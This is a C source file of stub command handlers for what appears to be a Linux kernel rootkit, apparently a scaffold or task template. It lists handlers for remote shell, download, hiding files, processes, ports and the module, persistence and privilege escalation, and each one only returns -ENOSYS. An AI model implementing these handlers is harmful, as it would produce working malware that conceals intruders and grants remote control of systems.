// SPDX-License-Identifier: GPL-2.0
// execution/commands.c - Individual command handlers.
#include <linux/fs.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/utsname.h>
#include "rootkit.h"

// Each handler receives the session and an optional argument string.
// Send the response back through rk_send_response or rk_send_sealed.

int cmd_ping(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_status(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_info(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_shell(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_shell_status(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_exec_shell(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_download(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_hide_file(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_file(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_hide_pid(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_pid(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_hide_content(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_content(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_hide_port(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_port(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_hide_module(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_module(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_all(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_list(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_persist(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unpersist(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_escalate(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_quit(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}
